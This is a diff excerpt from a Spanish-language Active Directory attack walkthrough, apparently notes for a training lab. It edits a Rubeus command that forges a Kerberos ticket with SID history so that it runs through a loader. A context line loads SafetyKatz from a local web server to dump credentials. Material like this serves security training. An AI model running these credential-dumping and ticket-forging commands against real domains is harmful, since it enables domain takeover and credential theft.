@@ -1426,7 +1426,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 
 Ahora crearemos el ticket que inyectaremos
 ```shell
-C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:9688c44bcc2ad7ea6f1ba555b0f4981f /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914 /ldap /user:Administrator /nowrap
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:9688c44bcc2ad7ea6f1ba555b0f4981f /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914 /ldap /user:Administrator /nowrap
 ```
 
 Se nos generara un ticket en base64 que deberemos de inyectar
